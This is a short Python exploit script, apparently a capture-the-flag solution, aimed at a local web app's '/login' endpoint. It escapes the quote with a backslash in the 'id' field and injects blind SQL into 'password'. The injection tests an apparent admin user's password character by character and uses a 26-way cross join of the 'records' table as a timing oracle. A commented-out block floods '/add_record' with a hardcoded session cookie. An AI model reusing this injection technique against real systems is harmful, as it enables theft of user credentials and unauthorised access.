import requests

url='http://127.0.0.1:5000'
'''
cookies={
    'session':'.eJydjs0KwjAQhF8l7LlIss0mTZ_Cu4hsNxtbqD809SS-uwHfwNMwzDfMvOFSVq6zVhhPbzB7E7hprXxV6OC4Klc16-NqlrvZH4ZFWmj2eanm2ZgDnD_dn71z18Y3rTOM-_bS5pYMI2AWxSmQL2QLh1DYBueJ-6yFUsCMkcgPLC65oDQ0gHycVJJPuSBZq5GCZRLEvjFCkTy7woMPCT0m6snFrK0qw8Q2iVXpRThoRs6l3b-8qm6_N5xvyx0-X3IcWrY.Zs9qeA.M4fl-ouqTuDDbU5hdF6c55DoZlQ'
}
for i in range(50):
    for i in range(1,127):
        data={'record_text':chr(i)}
        result=requests.post(url+'/add_record',data=data,cookies=cookies)
print('끝')
'''


databases=''
for i in range(65,90):
    databases+=f'records {chr(i)}, '
databases+='records Z'
#print(databases)
data={'id':'aa\\','password':f'|| if(ord(mid((select password from users where id=0b110000101100100011011010110100101101110),1,1))=97,(select A.record_text from {databases}),1)-- '}
print(data)
result=requests.post(url+'/login',data=data)
print(result.text)
